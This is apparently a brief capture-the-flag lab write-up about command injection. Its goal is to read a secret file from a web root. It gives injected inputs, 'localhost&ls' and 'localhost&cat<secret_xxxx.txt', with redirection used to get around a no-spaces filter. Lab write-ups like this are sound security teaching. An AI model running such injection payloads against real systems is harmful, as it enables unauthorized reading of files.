
> [!NOTE] Problem
> read file `/var/www/html/secret_xxxx.txt` by using command injection

1. in this lab we can't using space 
2. we will list directory by using `localhost&ls`
3. next we will see flag file name
4. using `localhost&cat<secret_xxxx.txt`
